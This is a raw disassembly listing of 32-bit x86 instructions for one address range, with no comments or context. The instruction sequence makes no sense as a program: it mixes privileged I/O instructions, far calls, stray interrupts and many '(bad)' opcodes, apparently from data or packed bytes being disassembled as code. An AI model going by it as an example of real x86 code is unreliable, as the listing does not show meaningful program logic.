  41b604:	aam    0x4a
  41b606:	call   0x4a2:0x25ba6037
  41b60d:	xor    edi,DWORD PTR [ecx+0x7a]
  41b610:	mov    ecx,0x2483d145
  41b615:	xchg   edi,eax
  41b616:	xor    al,0x58
  41b618:	inc    eax
  41b619:	enter  0x55c6,0x7
  41b61d:	fild   DWORD PTR [ebp+0xbb7121e]
  41b623:	les    esp,FWORD PTR [edi+0x42]
  41b626:	pop    ebx
  41b627:	xor    ebp,DWORD PTR [eax-0x7e9f18e2]
  41b62d:	push   edi
  41b62e:	clc    
  41b62f:	inc    ecx
  41b630:	push   es
  41b631:	push   ebx
  41b632:	xchg   esp,eax
  41b633:	ds mov esi,0xa7cfd3d5
  41b639:	js     0x41b675
  41b63b:	loope  0x41b65e
  41b63d:	shl    BYTE PTR [esi-0x3b860d78],1
  41b643:	mov    WORD PTR [ecx-0x2cc56332],gs
  41b649:	lods   al,BYTE PTR ds:[esi]
  41b64a:	jp     0x41b5f7
  41b64c:	cmp    al,0x7b
  41b64e:	out    0x41,al
  41b650:	or     BYTE PTR [esi],dl
  41b652:	in     al,dx
  41b653:	leave  
  41b654:	mov    DWORD PTR [esi+0x2c],esi
  41b657:	jl     0x41b5e5
  41b659:	clts   
  41b65b:	data16 cs into 
  41b65e:	and    eax,0x244e6ab2
  41b663:	jo     0x41b671
  41b665:	stc    
  41b666:	mov    edi,0xee6640b6
  41b66b:	je     0x41b6bb
  41b66d:	pop    esi
  41b66e:	in     eax,0x3e
  41b670:	popf   
  41b671:	outs   dx,DWORD PTR ds:[esi]
  41b672:	inc    ebx
  41b673:	jle    0x41b673
  41b675:	push   0xee69af34
  41b67a:	xchg   ebx,eax
  41b67b:	mov    ch,0xf7
  41b67d:	adc    eax,edx
  41b67f:	lahf   
  41b680:	sti    
  41b681:	sub    DWORD PTR [edx+0x36],esp
  41b684:	mov    bh,0xd4
  41b686:	out    dx,eax
  41b687:	pop    esi
  41b688:	adc    al,0xac
  41b68a:	mov    dl,0xed
  41b68c:	mov    cl,0x93
  41b68e:	push   ebp
  41b68f:	mov    cl,0x49
  41b691:	and    dl,BYTE PTR [edx+ecx*8-0x32]
  41b695:	fcom   st(3)
  41b697:	lods   al,BYTE PTR ds:[esi]
  41b698:	nop
  41b699:	std    
  41b69a:	fyl2x  
  41b69c:	add    DWORD PTR [ecx+0x56],ebx
  41b69f:	fisubr WORD PTR [esi+0x1d]
  41b6a2:	pop    es
  41b6a3:	or     eax,DWORD PTR [eax]
  41b6a5:	jno    0x41b640
  41b6a7:	icebp  
  41b6a8:	and    DWORD PTR [ebx],0x5ed4276d
  41b6ae:	adc    al,0x60
  41b6b0:	sub    BYTE PTR [edx-0x40],bh
  41b6b3:	outs   dx,BYTE PTR ds:[esi]
  41b6b4:	clc    
  41b6b5:	loop   0x41b68d
  41b6b7:	xchg   edi,eax
  41b6b8:	dec    eax
  41b6b9:	stc    
  41b6ba:	aas    
  41b6bb:	sahf   
  41b6bc:	xor    BYTE PTR [edi-0x9],ah
  41b6bf:	stos   DWORD PTR es:[edi],eax
  41b6c0:	adc    al,0x57
  41b6c2:	push   ds
  41b6c3:	xchg   ebp,eax
  41b6c4:	cwde   
  41b6c5:	data16 mov ch,0x67
  41b6c8:	add    dh,dh
  41b6ca:	adc    edi,DWORD PTR [ebx]
  41b6cc:	mov    dl,0x26
  41b6ce:	out    dx,eax
  41b6cf:	out    0x5f,al
  41b6d1:	jle    0x41b697
  41b6d3:	in     al,0x91
  41b6d5:	rcr    bh,cl
  41b6d7:	jbe    0x41b6c5
  41b6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6da:	jmp    0x41b697
  41b6dc:	ja     0x41b724
  41b6de:	pop    ecx
  41b6df:	arpl   WORD PTR [edi-0x59],dx
  41b6e2:	pop    ecx
  41b6e3:	loope  0x41b706
  41b6e5:	fcmovne st,st(1)
  41b6e7:	not    BYTE PTR [esi+0x43]
  41b6ea:	pop    ds
  41b6eb:	sar    ebx,1
  41b6ed:	pop    ecx
  41b6ee:	mov    esp,0x7b79dfed
  41b6f3:	add    bh,BYTE PTR [eax+0x9cd8af9]
  41b6f9:	leave  
  41b6fa:	push   esp
  41b6fb:	ss je  0x41b6a4
  41b6fe:	jnp    0x41b73d
  41b700:	(bad)
  41b703:	ja     0x41b6f9
  41b705:	mov    DWORD PTR [ebx+ebp*4-0x5d],0x94e0cd54
  41b70d:	add    eax,0xf70e99c8
  41b712:	shl    BYTE PTR [edx+edx*4-0x2d5eb5ca],1
  41b719:	jle    0x41b6e1
  41b71b:	sar    DWORD PTR [edi+0x3b],0xe
  41b71f:	outs   dx,BYTE PTR ds:[esi]
  41b720:	sub    BYTE PTR [edi-0x13],cl
  41b723:	xor    DWORD PTR [edi+0x2871759a],eax
  41b729:	aas    
  41b72a:	xor    BYTE PTR ds:0xffe8ff07,ch
  41b730:	push   ss
  41b731:	inc    esp
  41b732:	inc    ebp
  41b733:	push   ds
  41b734:	out    dx,eax
  41b735:	xchg   ebx,eax
  41b736:	inc    ecx
  41b737:	push   es
  41b738:	adc    ebp,DWORD PTR [esi+edx*2-0x8]
  41b73c:	push   0xb64b8698
  41b741:	(bad)  
  41b742:	fsub   QWORD PTR [eax-0x4f]
  41b745:	xchg   ebx,eax
  41b746:	hlt    
  41b747:	dec    eax
  41b748:	ret    
  41b749:	aas    
  41b74a:	jnp    0x41b7c0
  41b74c:	cmp    bh,dh
  41b74e:	push   ds
  41b74f:	out    0x73,eax
  41b751:	popa   
  41b752:	xchg   edx,eax
  41b753:	scas   eax,DWORD PTR es:[edi]
  41b754:	cmp    eax,0xb1cd90eb
  41b759:	stc    
  41b75a:	std    
  41b75b:	icebp  
  41b75c:	add    eax,0x1f80fbeb
  41b761:	mov    fs,WORD PTR [ebx-0x9]
  41b764:	mov    esi,0x27375dc3
  41b769:	pop    es
  41b76a:	test   BYTE PTR [eax+0x5a4a3672],bh
  41b770:	repnz fistp WORD PTR cs:[esi+eiz*1-0x3c27218d]
  41b779:	xor    ah,BYTE PTR [ecx]
  41b77b:	xor    ah,BYTE PTR [eax]
  41b77d:	mov    al,ds:0x595cca3f
  41b782:	aas    
  41b783:	jle    0x41b7c3
  41b785:	outs   dx,BYTE PTR ds:[esi]
  41b786:	sub    al,0x28
  41b788:	fsubr  QWORD PTR ds:0xaf56015d
  41b78e:	pop    es
  41b78f:	pop    esi
  41b790:	adc    eax,0x830f9b41
  41b795:	xlat   BYTE PTR ds:[ebx]
  41b796:	test   BYTE PTR [ebx+0x6f6b437a],ch
  41b79c:	(bad)  
  41b79d:	mov    ebp,0x2074174d
  41b7a2:	xchg   edx,eax
  41b7a3:	sbb    BYTE PTR [ecx-0x1a],cl
  41b7a6:	enter  0xbded,0xe1
  41b7aa:	or     eax,0x60e739be
  41b7af:	or     BYTE PTR [edx+0x76],dh
  41b7b2:	add    DWORD PTR ds:0x508e30a1,0xebb4d780
  41b7bc:	cmp    al,0x7
  41b7be:	loopne 0x41b7ed
  41b7c0:	ret    0xba20
  41b7c3:	push   eax
  41b7c4:	sti    
  41b7c5:	inc    ebx
  41b7c6:	mov    ah,0x5
  41b7c8:	out    0x45,eax
  41b7ca:	mov    dl,0x84
  41b7cc:	vpaddusw xmm0,xmm7,XMMWORD PTR [ecx+0x55e5ca07]
  41b7d4:	repz jb 0x41b7a4
  41b7d7:	xchg   ecx,eax
  41b7d8:	idiv   DWORD PTR [esp+ecx*4]
  41b7db:	call   0x7e12:0x46a8053
  41b7e2:	xchg   esi,eax
  41b7e3:	dec    eax
  41b7e4:	and    eax,0xc2348940
  41b7e9:	shr    esi,1
  41b7eb:	and    eax,0x14f411c2
  41b7f0:	(bad)  
  41b7f1:	scas   eax,DWORD PTR es:[edi]
  41b7f2:	mov    bl,0x1d
  41b7f4:	inc    ebp
  41b7f5:	and    cl,BYTE PTR [ebp+0x56]
  41b7f8:	mov    bl,0xa3
  41b7fa:	sub    ecx,esp
  41b7fc:	cmp    DWORD PTR [esi-0x37],eax
  41b7ff:	dec    ecx
  41b800:	sub    eax,0xe0dd4402
  41b805:	add    eax,0x6e5b39cb
  41b80a:	sub    DWORD PTR [ebx-0x155193e7],ecx
  41b810:	out    0x25,al
  41b812:	in     eax,0x35
  41b814:	xchg   ebp,eax
  41b815:	sar    BYTE PTR [edx],1
  41b817:	je     0x41b846
  41b819:	aaa    
  41b81a:	cdq    
  41b81b:	or     ch,BYTE PTR [edx+0x3db7f4fb]
  41b821:	dec    edx
  41b822:	and    eax,0xf3a43dba
  41b827:	xchg   edx,eax
  41b828:	add    edi,DWORD PTR [edx]
  41b82a:	fnstenv [edx]
  41b82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b82d:	mov    ch,0x47
  41b82f:	fdivr  st(2),st
  41b831:	sub    bh,al
  41b833:	shr    BYTE PTR [ebx+0x18],cl
  41b836:	sub    DWORD PTR [esi],eax
  41b838:	popf   
  41b839:	mov    edx,0xb2133a81
  41b83e:	stos   DWORD PTR es:[edi],eax
  41b83f:	xor    ebp,0x3d
  41b842:	std    
  41b843:	aad    0xc9
  41b845:	inc    edi
  41b846:	rcl    al,1
  41b848:	aad    0x43
  41b84a:	je     0x41b84b
  41b84c:	mov    ds:0x7e81cc06,eax
  41b851:	mov    bl,0x36
  41b853:	lods   eax,DWORD PTR ds:[esi]
  41b854:	xchg   esi,eax
  41b855:	dec    edx
  41b856:	pushf  
  41b857:	std    
  41b858:	mov    ah,0xaa
  41b85a:	lahf   
  41b85b:	sbb    ebx,DWORD PTR [edx+0x7f]
  41b85e:	push   eax
  41b85f:	bound  esp,QWORD PTR [esi]
  41b861:	sahf   
  41b862:	push   edi
  41b863:	loopne 0x41b843
  41b865:	mov    eax,0x299ff4e0
  41b86a:	test   al,0xd
  41b86c:	push   es
  41b86d:	xor    DWORD PTR [esi+eax*1+0x38b3f70f],0xb95d6876
  41b878:	scas   al,BYTE PTR es:[edi]
  41b879:	inc    edx
  41b87a:	neg    DWORD PTR ds:[ebp+esi*1-0x34]
  41b87f:	sub    DWORD PTR [esi],ebx
  41b881:	stos   BYTE PTR es:[edi],al
  41b882:	xchg   ebx,eax
  41b883:	lds    edx,FWORD PTR [eax+edx*2+0x31]
  41b887:	push   edi
  41b888:	loopne 0x41b84a
  41b88a:	lock arpl WORD PTR [edx-0x6d68172a],si
  41b891:	mov    DWORD PTR [ecx],ebx
  41b893:	cmp    esi,esp
  41b895:	ja     0x41b8bd
  41b897:	push   0xffffff94
  41b899:	sub    al,0xa3
  41b89b:	jnp    0x41b878
  41b89d:	ins    BYTE PTR es:[edi],dx
  41b89e:	mov    ecx,0x894ab88e
  41b8a3:	ror    edx,1
  41b8a5:	int    0x4e
  41b8a7:	sbb    esi,ebp
  41b8a9:	data16 loopne 0x41b929
  41b8ac:	jno    0x41b8e1
  41b8ae:	jge    0x41b921
  41b8b0:	sbb    BYTE PTR [ebp+0x5f],bl
  41b8b3:	add    al,BYTE PTR [edx-0xc]
  41b8b6:	pop    ebp
  41b8b7:	fbstp  TBYTE PTR [ecx+0x50a56b93]
  41b8bd:	dec    esi
  41b8be:	dec    ecx
  41b8bf:	inc    ecx
  41b8c0:	out    0x52,eax
  41b8c2:	push   0x7b301348
  41b8c7:	xchg   esp,eax
  41b8c8:	addr16 mov dh,0x54
  41b8cb:	dec    ecx
  41b8cc:	in     al,dx
  41b8cd:	jo     0x41b940
  41b8cf:	sahf   
  41b8d0:	dec    ebx
  41b8d1:	push   edi
  41b8d2:	mov    ebx,DWORD PTR [eax]
  41b8d4:	xchg   edi,eax
  41b8d5:	sbb    ebx,DWORD PTR [eax+0x6]
  41b8d8:	xor    esi,ecx
  41b8da:	push   edx
  41b8db:	popa   
  41b8dc:	jecxz  0x41b867
  41b8de:	fild   DWORD PTR [ecx+ebx*8-0x5f]
  41b8e2:	stos   BYTE PTR es:[edi],al
  41b8e3:	mov    al,ds:0x3d238890
  41b8e8:	pop    ebx
  41b8e9:	xor    esp,esi
  41b8eb:	and    DWORD PTR [ebx-0x68],0x5
  41b8ef:	(bad)  
  41b8f0:	jb     0x41b88e
  41b8f2:	sbb    DWORD PTR [esi-0x31e2bdc2],esi
  41b8f8:	adc    BYTE PTR [esi],bl
  41b8fa:	in     eax,0x7e
  41b8fc:	pop    es
  41b8fd:	pop    edx
  41b8fe:	jbe    0x41b969
  41b900:	sub    eax,0xe51fed76
  41b905:	adc    BYTE PTR [esi-0x4ac141c2],0xb5
  41b90c:	not    ah
  41b90e:	mov    bh,0x63
  41b910:	std    
  41b911:	add    bl,BYTE PTR [eax-0x6e]
  41b914:	inc    ecx
  41b915:	sahf   
  41b916:	lock lock (bad) 
  41b919:	fist   WORD PTR [ebx]
  41b91b:	mov    ecx,0xe2fb7b12
  41b920:	fmul   st(2),st
  41b922:	xor    eax,0xe9d0ba98
  41b927:	xor    DWORD PTR [ebx-0x41],esp
  41b92a:	repnz cmp ah,BYTE PTR [edx+0x2b1b45fe]
  41b931:	add    BYTE PTR [ecx],dl
  41b933:	add    eax,0xc0aceef8
  41b938:	in     eax,dx
  41b939:	mov    ah,0x8c
  41b93b:	sub    ecx,esp
  41b93d:	sbb    al,0xc3
  41b93f:	dec    ebx
  41b940:	clc    
  41b941:	stc    
  41b942:	aaa    
  41b943:	div    cl
  41b945:	popf   
  41b946:	inc    ebp
  41b947:	scas   eax,DWORD PTR es:[edi]
  41b948:	and    edi,edx
  41b94a:	cdq    
  41b94b:	call   0xb983e42e
  41b950:	popw   ss
  41b952:	(bad)  
  41b953:	enter  0x1b12,0xed
  41b957:	outs   dx,DWORD PTR ds:[esi]
  41b958:	pop    ecx
  41b959:	arpl   WORD PTR [edi+eax*1+0x13fec8fe],bx
  41b960:	sub    BYTE PTR [edi-0x36],dl
  41b963:	mov    eax,0x6788078d
  41b968:	mov    ecx,0x9b9a2122
  41b96d:	int    0x2d
  41b96f:	loopne 0x41b9e3
  41b971:	ins    DWORD PTR es:[edi],dx
  41b972:	and    esp,DWORD PTR [ebp-0x18]
  41b975:	push   edi
  41b976:	or     ebp,DWORD PTR [ebp+edx*1-0x6]
  41b97a:	popa   
  41b97b:	scas   al,BYTE PTR es:[edi]
  41b97c:	inc    edi
  41b97d:	shl    DWORD PTR ss:[eax+0x6e77c76d],0x1e
  41b985:	ds add esp,eax
  41b988:	lea    esp,[eax+0x2e5c2c0f]
  41b98e:	mov    ebx,0x5cdb549
  41b993:	inc    esi
  41b994:	lods   eax,DWORD PTR ds:[esi]
  41b995:	(bad)  
  41b996:	fld    DWORD PTR [edi-0x4155f85a]
  41b99c:	fstp   TBYTE PTR [edi-0x4b]
  41b99f:	adc    al,0x99
  41b9a1:	sub    al,0x1d
  41b9a3:	lock fwait
  41b9a5:	mov    dh,0x9a
  41b9a7:	mov    al,ds:0x667aac3
  41b9ac:	sbb    eax,0x16b68cb9
  41b9b1:	out    0xb2,al
  41b9b3:	jnp    0x41b9c2
  41b9b5:	xchg   edx,eax
  41b9b6:	xor    ah,BYTE PTR [esp+esi*4]
  41b9b9:	xchg   ecx,eax
  41b9ba:	popa   
  41b9bb:	mov    edi,0x96fa3262
  41b9c0:	push   esi
  41b9c1:	paddusb mm0,mm5
  41b9c4:	ret    
  41b9c5:	(bad)  
  41b9c6:	ja     0x41b9a1
  41b9c8:	call   edi
  41b9ca:	sbb    al,0xb4
  41b9cc:	dec    esp
  41b9cd:	neg    BYTE PTR [edx-0x1b]
  41b9d0:	push   ds
  41b9d1:	and    eax,0x3b474c49
  41b9d6:	pop    ds
  41b9d7:	sbb    al,BYTE PTR ds:0xb8ffc406
  41b9dd:	mov    edi,0xab60c99e
  41b9e2:	ret    0xa1fb
  41b9e5:	cld    
  41b9e6:	jns    0x41ba45
  41b9e8:	pop    esi
  41b9e9:	jmp    0x1ad988c
  41b9ee:	mov    eax,ds:0x1df71290
  41b9f3:	mov    ebx,0xf25f222
  41b9f8:	imul   edi,DWORD PTR [ecx-0x23d1c8f2],0xffffffa6
  41b9ff:	cmp    DWORD PTR [esi+edi*2+0x4530150b],esp
  41ba06:	xor    al,0xda
  41ba08:	cs jl  0x41ba07
  41ba0b:	push   ebp
  41ba0c:	inc    esi
  41ba0d:	add    DWORD PTR [ebx-0x17],ecx
  41ba10:	pop    esp
  41ba11:	lods   eax,DWORD PTR ds:[esi]
  41ba12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba13:	ficomp WORD PTR [edi-0x2e]
  41ba16:	shl    esi,cl
  41ba18:	(bad)  
  41ba19:	(bad)  
  41ba1b:	es jb  0x41b9eb
  41ba1e:	pop    edx
  41ba1f:	ds jle 0x41b9c2
  41ba22:	sahf   
  41ba23:	shl    BYTE PTR [ebx+0x18db55ef],0x9b
  41ba2a:	xor    bl,BYTE PTR [ebp+0x29]
  41ba2d:	xchg   ebx,eax
  41ba2e:	jp     0x41ba7a
  41ba30:	pop    ds
  41ba31:	les    esp,FWORD PTR [edx]
  41ba33:	mov    ah,0x38
  41ba35:	ins    DWORD PTR es:[edi],dx
  41ba36:	ja     0x41ba05
  41ba38:	xchg   esp,eax
  41ba39:	xchg   ecx,eax
  41ba3a:	retf   
  41ba3b:	lods   al,BYTE PTR ds:[esi]
  41ba3c:	daa    
  41ba3d:	jmp    0x41ba5f
  41ba3f:	pusha  
  41ba40:	jecxz  0x41ba17
  41ba42:	xor    DWORD PTR [esi-0x4752e368],esi
  41ba48:	int    0x54
  41ba4a:	inc    edx
  41ba4b:	fs sub dh,bl
  41ba4e:	repnz out 0xc3,al
  41ba51:	xchg   esp,eax
  41ba52:	xchg   ebp,eax
  41ba53:	dec    ebp
  41ba54:	xchg   ebp,eax
  41ba55:	xor    al,0x71
  41ba57:	dec    eax
  41ba58:	pop    eax
  41ba59:	inc    sp
  41ba5b:	xor    BYTE PTR [ecx+ebx*8],0x7d
  41ba5f:	stos   BYTE PTR es:[edi],al
  41ba60:	pushf  
  41ba61:	cmp    BYTE PTR [esi-0x5747823d],0x70
  41ba68:	pop    esi
  41ba69:	fimul  DWORD PTR [ebp-0x2e]
  41ba6c:	sahf   
  41ba6d:	mov    dh,0x29
  41ba6f:	imul   ebx,DWORD PTR [edx+0x490763c9],0xc506d0ac
  41ba79:	push   ss
  41ba7a:	ds dec esp
  41ba7c:	inc    ecx
  41ba7d:	les    esp,FWORD PTR [ecx-0x258a69e0]
  41ba83:	dec    esi
  41ba84:	push   cs
  41ba85:	cmc    
  41ba86:	arpl   WORD PTR [eax],di
  41ba88:	or     ebx,DWORD PTR [ebx-0x4f0cf3d1]
  41ba8e:	out    0xb6,al
  41ba90:	pop    esi
  41ba91:	sub    eax,0x1b7b2052
  41ba96:	pop    ebx
  41ba97:	in     eax,0xbb
  41ba99:	mov    al,0xfb
  41ba9b:	cli    
  41ba9c:	in     eax,dx
  41ba9d:	sbb    eax,0x277d7eb9
  41baa2:	adc    dl,al
  41baa4:	out    0x6e,eax
  41baa6:	inc    eax
  41baa7:	jno    0x41bacd
  41baa9:	ror    DWORD PTR [ebp-0x37],0x1e
  41baad:	fsubr  DWORD PTR [edi+0x1d]
  41bab0:	adc    ebp,DWORD PTR [edx+0x195a5dda]
  41bab6:	mov    dh,0xd2
  41bab8:	mov    ebp,0x99508ffe
  41babd:	ja     0x41bb25
  41babf:	or     BYTE PTR [edx-0x4b],0xb3
  41bac3:	jecxz  0x41ba9f
  41bac5:	gs pop es
  41bac7:	out    dx,al
  41bac8:	mov    eax,0x1d303f7a
  41bacd:	jl     0x41ba53
  41bacf:	addr16 ss xchg esi,eax
  41bad2:	fistp  DWORD PTR [esi-0x32]
  41bad5:	pushf  
  41bad6:	mov    ch,0xd7
  41bad8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bada:	aas    
  41badb:	lahf   
  41badc:	inc    esp
  41badd:	ror    DWORD PTR [edx+0x7d],cl
  41bae0:	xchg   ebp,eax
  41bae1:	inc    ecx
  41bae2:	int    0x41
  41bae4:	or     ebx,ebp
  41bae6:	inc    edi
  41bae7:	inc    ebx
  41bae8:	outs   dx,DWORD PTR ds:[esi]
  41bae9:	jae    0x41bb46
  41baeb:	in     eax,0x8d
  41baed:	xchg   ecx,eax
  41baee:	loopne 0x41baac
  41baf0:	sbb    BYTE PTR ds:0x2dcd29,ch
  41baf6:	and    eax,0x896da13c
  41bafb:	dec    esi
  41bafc:	sub    DWORD PTR [ebp-0x25],ebp
  41baff:	sbb    ebp,edx
  41bb01:	mov    WORD PTR [edi],gs
  41bb03:	pop    esp
  41bb04:	sub    ch,bl
  41bb06:	xchg   esi,eax
  41bb07:	retf   
  41bb08:	loope  0x41bb6f
  41bb0a:	push   cs
  41bb0b:	sub    edx,DWORD PTR [edx+0xc]
  41bb0e:	dec    eax
  41bb0f:	sub    eax,DWORD PTR [edx]
  41bb11:	hlt    
  41bb12:	lods   al,BYTE PTR ss:[esi]
  41bb14:	iret   
  41bb15:	or     dl,BYTE PTR [eax-0xa]
  41bb18:	sbb    eax,0xadc55f00
  41bb1d:	addr16 inc ecx
  41bb1f:	aas    
  41bb20:	cdq    
  41bb21:	mov    bh,0xa3
  41bb24:	push   esi
  41bb25:	and    al,0xfd
  41bb27:	xlat   BYTE PTR ds:[ebx]
  41bb28:	test   al,dh
  41bb2a:	loop   0x41bae4
  41bb2c:	nop
  41bb2d:	pusha  
  41bb2e:	aas    
  41bb2f:	fistp  WORD PTR [ebp+0x7a]
  41bb32:	pop    esp
  41bb33:	jns    0x41bae1
  41bb35:	jge    0x41bb99
  41bb37:	sbb    al,0x6b
  41bb39:	test   BYTE PTR [ebp-0xa],dl
  41bb3c:	lds    esp,FWORD PTR [ebx+eiz*2-0x36]
  41bb40:	loop   0x41bb69
  41bb42:	pop    ebp
  41bb43:	xor    al,0xb6
  41bb45:	pop    esp
  41bb46:	add    ch,BYTE PTR [esi-0x4d]
  41bb49:	popa   
  41bb4a:	push   cs
  41bb4b:	pop    es
  41bb4c:	adc    dh,cl
  41bb4e:	mov    ds,WORD PTR ds:0x21a5695f
  41bb54:	xchg   esp,eax
  41bb55:	gs pop eax
  41bb57:	dec    edi
  41bb58:	pop    ecx
  41bb59:	fwait
  41bb5a:	inc    ecx
  41bb5b:	or     ebp,edx
  41bb5d:	mov    eax,ds:0x9f8b35b5
  41bb62:	scas   al,BYTE PTR es:[edi]
  41bb63:	test   BYTE PTR [eax-0x7bc8375],0xc7
  41bb6a:	lahf   
  41bb6b:	test   DWORD PTR [ebx-0x34],ecx
  41bb6e:	and    edx,DWORD PTR [eax-0x42]
  41bb71:	int3   
  41bb72:	xor    eax,0x54fe1e92
  41bb77:	mov    eax,ds:0x77e0b23a
  41bb7c:	inc    ebx
  41bb7d:	xor    ch,BYTE PTR [esi]
  41bb7f:	and    DWORD PTR [ecx+0x6ec313c7],ebx
  41bb85:	loope  0x41bba1
  41bb87:	(bad)  [ebp+edx*4-0x3168fd9e]
  41bb8e:	imul   edx,esp,0xb665f2b8
  41bb94:	call   0x46e2:0xa7e67fd5
  41bb9b:	sub    edi,DWORD PTR [ecx-0x7c20ac59]
  41bba1:	pop    ss
  41bba2:	jg     0x41bb49
  41bba4:	iret   
  41bba5:	ror    BYTE PTR ds:0xc55f0aa3,0xfa
  41bbac:	ins    DWORD PTR es:[edi],dx
  41bbad:	mov    eax,ebx
  41bbaf:	adc    bh,BYTE PTR [ecx-0x8]
  41bbb2:	mov    dl,0x23
  41bbb4:	xchg   ebp,eax
  41bbb5:	xchg   BYTE PTR [ecx+0x1c90e1c1],bl
  41bbbb:	inc    eax
  41bbbc:	or     BYTE PTR [edi],0xfe
  41bbbf:	xchg   ebx,eax
  41bbc0:	cld    
  41bbc1:	aas    
  41bbc2:	push   ebp
  41bbc3:	jl     0x41bbff
  41bbc5:	inc    esp
  41bbc6:	test   al,0xab
  41bbc8:	adc    eax,0x87550653
  41bbcd:	pushf  
  41bbce:	sahf   
  41bbcf:	mov    ch,ah
  41bbd1:	shr    ebx,0xf5
  41bbd4:	aas    
  41bbd5:	lock ins BYTE PTR es:[edi],dx
  41bbd7:	mov    al,0x99
  41bbd9:	es out 0x83,eax
  41bbdc:	cmp    BYTE PTR [esi+0x73],ah
  41bbdf:	xchg   esi,eax
  41bbe0:	int3   
  41bbe1:	ins    DWORD PTR es:[edi],dx
  41bbe2:	add    DWORD PTR [ecx+0x16c3c1eb],ebp
  41bbe8:	pop    ebx
  41bbe9:	cli    
  41bbea:	mov    ebp,0x8eecaea5
  41bbef:	nop
  41bbf0:	or     BYTE PTR [edi-0x60],dh
  41bbf3:	jmp    0x41bc33
  41bbf5:	adc    ah,BYTE PTR [esi+ebx*4+0x67c1b2de]
  41bbfc:	loopne 0x41bc15
  41bbfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbff:	fistp  DWORD PTR [ebx+0x3a2d878c]
  41bc05:	loop   0x41bbce
  41bc07:	lock lods eax,DWORD PTR ds:[esi]
  41bc09:	dec    esp
  41bc0a:	stos   BYTE PTR es:[edi],al
  41bc0b:	xor    bh,BYTE PTR [ebx+0x48741bdc]
  41bc11:	clc    
  41bc12:	lock dec ebp
  41bc14:	fisttp QWORD PTR [esi+0x10]
  41bc17:	push   0x1c
  41bc19:	xlat   BYTE PTR ds:[ebx]
  41bc1a:	pop    es
  41bc1b:	sbb    ecx,DWORD PTR [eax-0xc]
  41bc1e:	in     eax,0xb1
  41bc20:	ret    
  41bc21:	adc    BYTE PTR [ebx],bh
  41bc23:	mov    bh,0xb0
  41bc25:	repz jle 0x41bc84
  41bc28:	les    edi,FWORD PTR [esi]
  41bc2a:	enter  0x5fee,0x7c
  41bc2e:	les    edi,FWORD PTR [ecx+0x7f]
  41bc31:	add    al,0x1b
  41bc33:	inc    edi
  41bc34:	sbb    ebp,DWORD PTR [esi-0x6a6a78b5]
  41bc3a:	ficomp WORD PTR [ebx]
  41bc3c:	loop   0x41bbd5
  41bc3e:	and    eax,0xe2640c0c
  41bc43:	mov    eax,DWORD PTR [ecx-0x66255eb0]
  41bc49:	sub    eax,0x747a16e3
  41bc4e:	push   0xffffffb7
  41bc50:	dec    DWORD PTR ds:0xc755ca11
  41bc56:	jp     0x41bcc2
  41bc58:	mov    ds:0xb6421bf5,eax
  41bc5d:	es daa 
  41bc5f:	dec    esi
  41bc60:	enter  0x4f2,0x84
  41bc64:	and    eax,0xd0ed3b7
  41bc69:	(bad)  
  41bc6a:	in     eax,0xb5
  41bc6c:	jl     0x41bc96
  41bc6e:	xchg   ecx,eax
  41bc6f:	hlt    
  41bc70:	and    eax,0xd5054c2
  41bc75:	push   0xffffffa5
  41bc77:	repnz imul eax,DWORD PTR [ebx+0x2668bf38],0x26d661fe
  41bc82:	mov    dl,0x71
  41bc84:	push   0x5609b0bd
  41bc89:	(bad)  
  41bc8a:	outs   dx,BYTE PTR ds:[esi]
  41bc8b:	fisubr WORD PTR [ebp-0x8]
  41bc8e:	inc    edx
  41bc8f:	popf   
  41bc90:	dec    ebp
  41bc91:	or     eax,0x6cf1fdf1
  41bc96:	gs inc edi
  41bc98:	imul   eax,ebx,0x7
  41bc9b:	fwait
  41bc9c:	shl    BYTE PTR [ebp-0x1d],1
  41bc9f:	mov    cl,BYTE PTR [ebx]
  41bca1:	xor    al,0x11
  41bca3:	mov    ah,0x47
  41bca5:	and    al,0xe1
  41bca7:	add    al,0xc6
  41bca9:	xchg   esi,eax
  41bcaa:	add    dl,BYTE PTR [edx+0xc951bec]
  41bcb0:	popa   
  41bcb1:	xchg   BYTE PTR [edx],dl
  41bcb3:	or     al,0x54
  41bcb5:	repz imul ebp,DWORD PTR [ebx-0x1],0xffffff94
  41bcba:	stos   DWORD PTR es:[edi],eax
  41bcbb:	pop    edx
  41bcbc:	jbe    0x41bc91
  41bcbe:	pop    ss
  41bcbf:	nop
  41bcc0:	mov    WORD PTR [edx],gs
  41bcc2:	xchg   ecx,eax
  41bcc3:	mov    ebp,DWORD PTR [edi]
  41bcc5:	xchg   edx,eax
  41bcc6:	in     al,dx
  41bcc7:	dec    ecx
  41bcc8:	mov    eax,ds:0x2797e4d5
  41bccd:	inc    eax
  41bcce:	sbb    DWORD PTR [ebp+eiz*1-0x6f],edx
  41bcd2:	je     0x41bd04
  41bcd4:	lods   eax,DWORD PTR ds:[esi]
  41bcd5:	addr16 xor al,0x2a
  41bcd8:	jne    0x41bcb2
  41bcda:	xor    ecx,edi
  41bcdc:	xchg   DWORD PTR [eax],ebx
  41bcde:	ins    DWORD PTR es:[edi],dx
  41bcdf:	ret    
  41bce0:	mov    al,ds:0x557b4615
  41bce5:	ins    BYTE PTR es:[edi],dx
  41bce6:	xchg   DWORD PTR [esp-0x29b6616f],ecx
  41bced:	rcr    esp,0x1e
  41bcf0:	mov    edx,0xafcd0393
  41bcf5:	adc    BYTE PTR [eax],cl
  41bcf7:	out    0x97,al
  41bcf9:	(bad)
  41bcfd:	not    esi
  41bcff:	sbb    DWORD PTR [esi-0x6f],0x2d
  41bd03:	mov    DWORD PTR [esi+0x4b97404d],ebp
  41bd09:	jl     0x41bd76
  41bd0b:	cld    
  41bd0c:	call   0xf839e27e
  41bd11:	fidiv  WORD PTR [esi+0x77]
  41bd14:	stos   BYTE PTR es:[edi],al
  41bd15:	stos   BYTE PTR es:[edi],al
  41bd16:	mov    dh,dh
  41bd18:	add    BYTE PTR [esi-0x55],dl
  41bd1b:	jne    0x41bcd4
  41bd1d:	shr    esp,0x9e
  41bd20:	lods   eax,DWORD PTR ds:[esi]
  41bd21:	cs jae 0x41bd7a
  41bd24:	cmc    
  41bd25:	jmp    0x41bcb5
  41bd27:	mov    dh,0xb7
  41bd29:	push   0xb865928e
  41bd2e:	cmp    ch,BYTE PTR [esi]
